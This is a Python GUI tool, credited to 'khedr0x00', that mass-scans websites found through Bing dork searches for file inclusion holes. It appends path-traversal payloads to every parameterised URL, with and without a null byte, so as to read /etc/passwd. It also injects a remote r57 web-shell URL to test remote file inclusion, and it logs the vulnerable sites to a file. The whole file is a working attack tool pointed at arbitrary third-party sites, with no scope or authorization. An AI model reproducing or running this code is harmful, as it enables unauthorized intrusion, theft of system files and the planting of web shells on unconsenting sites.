import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox
import threading
import urllib.parse
import re
import socket
import os
import requests # Using requests for better Python 3 compatibility and features

class BingLFIRFISearcherGUI:
    def __init__(self, master):
        self.master = master
        master.title("Bing LFI-RFI Searcher")
        master.geometry("800x600")
        master.configure(bg="#2E2E2E") # Dark background

        # Header
        self.header_frame = tk.Frame(master, bg="#3E3E3E", bd=5)
        self.header_frame.pack(pady=10, fill="x", padx=10)
        self.header_label = tk.Label(self.header_frame, text="Bing LFI-RFI Searcher", font=("Arial", 18, "bold"), fg="#00FF00", bg="#3E3E3E")
        self.header_label.pack(pady=5)
        # Changed author to khedr0x00
        self.author_label = tk.Label(self.header_frame, text="Coded by khedr0x00", font=("Arial", 10), fg="#A9A9A9", bg="#3E3E3E")
        self.author_label.pack(pady=2)

        # Input Frame
        self.input_frame = tk.Frame(master, bg="#2E2E2E", padx=10, pady=10)
        self.input_frame.pack(fill="x", padx=10)

        # Dork List
        self.dork_label = tk.Label(self.input_frame, text="Dork List File:", fg="white", bg="#2E2E2E", font=("Arial", 10))
        self.dork_label.grid(row=0, column=0, sticky="w", pady=5)
        self.dork_entry = tk.Entry(self.input_frame, width=50, bg="#4E4E4E", fg="white", insertbackground="white", relief="flat")
        self.dork_entry.grid(row=0, column=1, pady=5, padx=5)
        self.dork_button = tk.Button(self.input_frame, text="Browse", command=self.browse_dork_file, bg="#008CBA", fg="white", relief="raised", bd=2)
        self.dork_button.grid(row=0, column=2, pady=5)

        # Thread Count
        self.thread_label = tk.Label(self.input_frame, text="Threads:", fg="white", bg="#2E2E2E", font=("Arial", 10))
        self.thread_label.grid(row=1, column=0, sticky="w", pady=5)
        self.thread_entry = tk.Entry(self.input_frame, width=10, bg="#4E4E4E", fg="white", insertbackground="white", relief="flat")
        self.thread_entry.insert(0, "10") # Default thread count
        self.thread_entry.grid(row=1, column=1, sticky="w", pady=5, padx=5)

        # Shell URL (for RFI)
        self.shell_label = tk.Label(self.input_frame, text="Shell URL (for RFI):", fg="white", bg="#2E2E2E", font=("Arial", 10))
        self.shell_label.grid(row=2, column=0, sticky="w", pady=5)
        self.shell_entry = tk.Entry(self.input_frame, width=50, bg="#4E4E4E", fg="white", insertbackground="white", relief="flat")
        self.shell_entry.insert(0, "http://www.xfocus.net/tools/200608/r57.txt?")
        self.shell_entry.grid(row=2, column=1, pady=5, padx=5)

        # Start Button
        self.start_button = tk.Button(self.input_frame, text="Start Search", command=self.start_search, bg="#4CAF50", fg="white", relief="raised", bd=2, font=("Arial", 12, "bold"))
        self.start_button.grid(row=3, column=0, columnspan=3, pady=15)

        # Output Area
        self.output_label = tk.Label(master, text="Results:", fg="white", bg="#2E2E2E", font=("Arial", 10))
        self.output_label.pack(anchor="w", padx=10)
        self.output_text = scrolledtext.ScrolledText(master, width=90, height=15, bg="#1E1E1E", fg="#00FF00", insertbackground="white", relief="sunken", bd=2, font=("Consolas", 9))
        self.output_text.pack(pady=10, padx=10, fill="both", expand=True)
        self.output_text.tag_config("lfi", foreground="red")
        self.output_text.tag_config("rfi", foreground="yellow")
        self.output_text.tag_config("info", foreground="lightblue")


        # Status Bar
        self.status_bar = tk.Label(master, text="Ready", bd=1, relief=tk.SUNKEN, anchor=tk.W, fg="#A9A9A9", bg="#3E3E3E", font=("Arial", 9))
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Internal variables
        self.is_searching = False
        self.stop_event = threading.Event()

    def browse_dork_file(self):
        filename = filedialog.askopenfilename(
            initialdir="./",
            title="Select Dork List File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if filename:
            self.dork_entry.delete(0, tk.END)
            self.dork_entry.insert(0, filename)

    def log_message(self, message, tag=None):
        self.output_text.insert(tk.END, message + "\n", tag)
        self.output_text.see(tk.END) # Auto-scroll to the end

    def update_status(self, message):
        self.status_bar.config(text=message)

    def start_search(self):
        if self.is_searching:
            messagebox.showinfo("Bing LFI-RFI Searcher", "Search is already running!")
            return

        dork_file = self.dork_entry.get()
        try:
            thread_count = int(self.thread_entry.get())
        except ValueError:
            messagebox.showerror("Input Error", "Thread count must be an integer.")
            return

        shell_url = self.shell_entry.get()

        if not os.path.exists(dork_file):
            messagebox.showerror("File Error", "Dork list file not found.")
            return

        self.is_searching = True
        self.stop_event.clear()
        self.start_button.config(text="Stop Search", command=self.stop_search, bg="#FF6347") # Change button to Stop
        self.output_text.delete(1.0, tk.END) # Clear previous results
        self.log_message("Starting search...", "info")
        self.update_status("Searching...")

        # Start the exploiter in a new thread
        self.exploiter_thread = threading.Thread(target=self._run_exploiter, args=(dork_file, thread_count, shell_url))
        self.exploiter_thread.daemon = True # Allow the thread to exit with the main program
        self.exploiter_thread.start()

    def stop_search(self):
        if not self.is_searching:
            messagebox.showinfo("Bing LFI-RFI Searcher", "No search is running.")
            return

        self.stop_event.set() # Signal the threads to stop
        self.log_message("Stopping search...", "info")
        self.update_status("Stopping...")

        # Wait for the exploiter thread to finish (optional, but good for cleanup)
        # self.exploiter_thread.join() # This would block the GUI, so don't do this directly in the GUI thread.
                                    # The thread will check stop_event periodically.
        self.is_searching = False
        self.start_button.config(text="Start Search", command=self.start_search, bg="#4CAF50")
        self.update_status("Stopped.")


    def _run_exploiter(self, dorks_file_path, thread_count, shell_url):
        try:
            with open(dorks_file_path, 'r') as f:
                dorks = [line.strip() for line in f if line.strip()]

            total_dorks = len(dorks)
            completed_dorks = 0

            for dork in dorks:
                if self.stop_event.is_set():
                    self.log_message("Search stopped by user.", "info")
                    break

                self.log_message(f"Processing dork: {dork}", "info")
                self.update_status(f"Searching: {completed_dorks}/{total_dorks} dorks processed - Current: {dork}")

                limit = threading.BoundedSemaphore(value=thread_count)
                tasks = []
                i = 1
                while i <= 451: # Original code used 451, meaning up to first=450
                    if self.stop_event.is_set():
                        break
                    limit.acquire()
                    search_url = f"http://www.bing.com/search?q={urllib.parse.quote_plus(dork)}&count=50&first={i}&FORM=PERE"
                    th = threading.Thread(target=self._dorker, args=(search_url, limit, shell_url))
                    tasks.append(th)
                    th.start()
                    i += 50
                for t in tasks:
                    t.join() # Wait for all threads for the current dork to complete

                completed_dorks += 1

            self.log_message("Search finished.", "info")
            self.update_status("Search completed.")
        except Exception as e:
            self.log_message(f"An error occurred during search: {e}", "lfi")
            self.update_status("Search error.")
        finally:
            self.is_searching = False
            self.start_button.config(text="Start Search", command=self.start_search, bg="#4CAF50")


    def _dorker(self, url, limit, shell):
        try:
            if self.stop_event.is_set():
                return

            headers = {'User-Agent': 'Mozilla/5.0'} # Basic User-Agent to avoid some blocks
            response = requests.get(url, headers=headers, timeout=5)
            response.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)
            data = response.text

            regex = re.compile(r"h3><a href=\"(.*?)\" h=")
            links = regex.findall(data)

            path = "../../../../../../../../../../../../../../etc/passwd"
            pathn = "../../../../../../../../../../../../../../etc/passwd%00"

            for link in links:
                if self.stop_event.is_set():
                    break

                link = link.strip()
                # Original logic for filtering links
                if re.search(r"=", link) and \
                   all(s not in link for s in ["youtube", "forum", "google", "viewtopic", "showthread", "blog", "yahoo"]):
                    try:
                        base_link = link.split('=')[0] + "="

                        # LFI Check (without null byte)
                        check_lfi_url = base_link + path
                        lfi_response = requests.get(check_lfi_url, headers=headers, timeout=3)
                        lfi_response.raise_for_status()
                        lfi_data = lfi_response.text

                        if re.search(r"root:x", lfi_data):
                            result_msg = (
                                "#########################################################\n"
                                f"[+]{base_link} /etc/passwd readed without null byte\n"
                                f"[+]read -> {base_link}{path}\n"
                                "[+]coded by khedr0x00\n" # Changed author here
                                "#########################################################"
                            )
                            self.log_message(result_msg, "lfi")
                            self._kaydet(result_msg.encode('utf-8')) # Save as bytes

                        else:
                            # LFI Check (with null byte)
                            check_lfi_null_url = base_link + pathn
                            lfi_null_response = requests.get(check_lfi_null_url, headers=headers, timeout=3)
                            lfi_null_response.raise_for_status()
                            lfi_null_data = lfi_null_response.text

                            if re.search(r"root:x", lfi_null_data):
                                result_msg = (
                                    "#########################################################\n"
                                    f"[+]{base_link} /etc/passwd readed with null byte!\n"
                                    f"[+]read -> {base_link}{pathn}\n"
                                    "[+]coded by khedr0x00\n" # Changed author here
                                    "#########################################################"
                                )
                                self.log_message(result_msg, "lfi")
                                self._kaydet(result_msg.encode('utf-8')) # Save as bytes
                            else:
                                self.log_message(f"{base_link} hasn't got lfi vulnerability", "info")
                                # RFI Check
                                check_rfi_url = base_link + shell
                                rfi_response = requests.get(check_rfi_url, headers=headers, timeout=3)
                                rfi_response.raise_for_status()
                                rfi_data = rfi_response.text

                                if re.search(r"safe_mode", rfi_data): # Checking for a string like 'safe_mode' in the response
                                    result_msg = (
                                        "#########################################################\n"
                                        "[+]remote file include vulnerability works!\n"
                                        f"[+]shell -> {base_link}{shell}\n"
                                        "[+]coded by khedr0x00\n" # Changed author here
                                        "#########################################################"
                                    )
                                    self.log_message(result_msg, "rfi")
                                    self._kaydet(result_msg.encode('utf-8')) # Save as bytes
                                else:
                                    self.log_message(f"{base_link} hasn't got rfi vulnerability", "info")

                    except requests.exceptions.Timeout:
                        self.log_message(f"{link} timeout during vulnerability check", "info")
                    except requests.exceptions.RequestException as e:
                        self.log_message(f"{link} request error: {e}", "info")
                    except Exception as e:
                        self.log_message(f"An unexpected error occurred for {link}: {e}", "info")

        except requests.exceptions.Timeout:
            self.log_message(f"{url} timeout during dork search", "info")
        except requests.exceptions.RequestException as e:
            self.log_message(f"{url} request error: {e}", "info")
        except Exception as e:
            self.log_message(f"An unexpected error occurred for {url}: {e}", "info")
        finally:
            limit.release()

    def _kaydet(self, yazi_bytes):
        """Appends bytes to results.txt"""
        try:
            with open('results.txt', 'ab') as f: # 'ab' for append in binary mode
                f.write(yazi_bytes + b'\n') # Add newline for clarity in file
        except IOError as e:
            self.log_message(f"Error saving to results.txt: {e}", "lfi")


if __name__ == "__main__":
    root = tk.Tk()
    app = BingLFIRFISearcherGUI(root)
    root.mainloop()
